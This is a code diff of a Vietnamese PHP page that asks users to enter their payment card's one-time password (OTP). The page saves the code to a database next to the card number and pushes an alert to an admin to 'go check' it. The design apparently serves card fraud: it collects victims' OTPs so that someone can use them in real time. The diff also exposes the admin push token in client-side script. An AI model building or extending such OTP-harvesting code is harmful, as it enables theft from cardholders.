@@ -5,29 +5,41 @@ if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'user') {
     header("Location: /no-permission");
     exit();
 }
+$id_history = $_GET['id'];
 
-// Kiểm tra xem người dùng đã gửi biểu mẫu chưa
+$query = "SELECT h.*, c.card_number FROM tbl_history h 
+LEFT JOIN tbl_card c ON h.id_card = c.id_card 
+WHERE h.id_history = ?";
+$stmt = $conn->prepare($query);
+$stmt->bind_param('i', $id_history);
+$stmt->execute();
+$result = $stmt->get_result();
+if ($result->num_rows > 0) {
+    $row = $result->fetch_assoc();
+}
+
 if (isset($_POST['confirm_otp'])) {
     $otp = $_POST['otp'];
-    $id_history = $_GET['id'];  // Lấy id_history từ URL
-    
-    // Kiểm tra OTP có hợp lệ không (bạn có thể thêm logic kiểm tra tùy ý)
+
     if (!empty($otp)) {
-        // Cập nhật OTP trong bảng tbl_history
         $query = "UPDATE tbl_history SET otp_card = ? WHERE id_history = ?";
         $stmt = $conn->prepare($query);
-        $stmt->bind_param('si',$otp, $id_history);
+        $stmt->bind_param('si', $otp, $id_history);
 
         if ($stmt->execute()) {
-            // Nếu cập nhật thành công
             $_SESSION['otp_success'] = "Nhập OTP thẻ thành công!";
+
+
+            echo "<script>
+                document.getElementById('otpCardButton').click();
+            </script>";
+
             header("Location: /user/history");
             exit();
         } else {
-            // Nếu cập nhật thất bại
             $_SESSION['otp_error'] = "Nhập OTP thất bại. Vui lòng thử lại.";
         }
-        
+
         $stmt->close();
     } else {
         $_SESSION['otp_error'] = "Vui lòng nhập OTP hợp lệ.";
@@ -47,15 +59,15 @@ if (isset($_POST['confirm_otp'])) {
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
     <title>OTP thẻ</title>
     <style>
-    input,
-    select {
-        width: 100%;
-        padding: 10px;
-        margin: 10px 0;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 16px;
-    }
+        input,
+        select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
     </style>
 </head>
 
@@ -65,11 +77,10 @@ if (isset($_POST['confirm_otp'])) {
         <div class="content_right container_form">
             <div class="container">
                 <h1 class="title">Nhập OTP thẻ</h1>
-                <!-- Form nhập OTP -->
                 <form id="otp-card-form" method="post" action="">
                     <label for="otp">Nhập mã OTP:</label>
                     <input type="password" id="otp" name="otp" required>
-                    <input type="submit" name="confirm_otp" value="Xác Nhận OTP">
+                    <input type="submit" id="otpCardButton" name="confirm_otp" value="Xác Nhận OTP">
                 </form>
                 <?php
                 if (isset($_SESSION['otp_error'])) {
@@ -83,7 +94,34 @@ if (isset($_POST['confirm_otp'])) {
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
     <script>
-        $(document).ready(function() {
+        document.getElementById('otpCardButton').addEventListener('click', function () {
+            console.log("aaaaaa");
+
+            fetch('../../component/send.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'token': '<?php echo htmlspecialchars($row["token_admin"]); ?>',
+                    'title': 'Thông báo từ bên user',
+                    'body': 'User vừa nhập OTP thẻ bạn hãy vào kiểm tra',
+                    'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
+                })
+            })
+                .then(response => response.text())
+                .then(data => {
+                    console.log('Success:', data);
+                    toastr.success('Thông báo đã được gửi thành công.');
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
+                });
+        });
+
+
+        $(document).ready(function () {
             <?php if (isset($_SESSION['otp_card_error'])): ?>
                 toastr.error("<?php echo $_SESSION['otp_card_error']; ?>");
                 <?php unset($_SESSION['otp_card_error']); ?>
